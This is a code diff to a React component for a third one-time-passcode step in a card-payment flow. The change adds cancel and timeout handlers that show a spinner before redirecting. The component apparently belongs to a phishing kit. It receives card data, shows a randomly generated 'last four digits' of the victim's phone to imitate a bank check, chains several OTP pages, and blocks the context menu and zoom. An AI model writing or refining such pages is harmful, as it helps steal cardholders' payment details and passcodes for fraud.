@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import LoadingSpinner from './LoadingSpinner';
 
 interface ThirdOTPPageProps {
   cardData: {
@@ -21,6 +22,8 @@ interface ThirdOTPPageProps {
   onRedirectToSecondOTP?: () => void;
   displayPrice: number;
   formatPrice: (price: number) => string;
+  onCancel: () => void;
+  onSessionExpired: () => void;
 }
 
 const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
@@ -37,17 +40,30 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
   getCardBrand,
   onRedirectToSecondOTP,
   displayPrice,
-  formatPrice
+  formatPrice,
+  onCancel,
+  onSessionExpired
 }) => {
   // Debug logging for price values
   console.log('🔍 ThirdOTPPage - Received props:', { displayPrice, formattedPrice: formatPrice(displayPrice) });
   
   const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
+  const [redirectLoading, setRedirectLoading] = useState(false);
   const [resendCount, setResendCount] = useState(0);
   const [resendCooldown, setResendCooldown] = useState(false);
   const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
   const [showResendSuccess, setShowResendSuccess] = useState(false);
   const [isLoading, setIsLoading] = useState(true);
+
+  // Handle timer expiry
+  useEffect(() => {
+    if (timeLeft === 0 && !redirectLoading) {
+      setRedirectLoading(true);
+      setTimeout(() => {
+        onSessionExpired();
+      }, 3500);
+    }
+  }, [timeLeft, onSessionExpired, redirectLoading]);
 
   // Loading state effect - show loading for 2.5 seconds
   useEffect(() => {
@@ -58,13 +74,15 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
     return () => clearTimeout(loadingTimer);
   }, []);
 
+
+
   // Timer countdown effect
   useEffect(() => {
     const timer = setInterval(() => {
-      setTimeLeft((prev) => {
+      setTimeLeft(prev => {
         if (prev <= 1) {
           clearInterval(timer);
-          window.location.href = '/payment-failed?error=timeout';
+          // Already handled by useEffect for timer expiry
           return 0;
         }
         return prev - 1;
@@ -108,6 +126,14 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
   const handleOTPInput = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
     setOtpValue(value);
+  };
+
+  const handleCancel = () => {
+    setRedirectLoading(true);
+    // Show loading spinner for 3.5 seconds before redirecting
+    setTimeout(() => {
+      handleOtpCancel();
+    }, 3500);
   };
 
   const handleSubmit = () => {
@@ -194,6 +220,11 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
       document.removeEventListener('contextmenu', preventZoom);
     };
   }, []);
+
+  // Show loading spinner during redirect only
+  if (redirectLoading) {
+    return <LoadingSpinner />;
+  }
 
   // Show loading screen first
   if (isLoading) {
@@ -303,7 +334,7 @@ const ThirdOTPPage: React.FC<ThirdOTPPageProps> = ({
           position: 'relative'
         }}>
           <button 
-            onClick={handleOtpCancel}
+            onClick={handleCancel}
             disabled={otpSubmitting}
             style={{
               background: 'none',
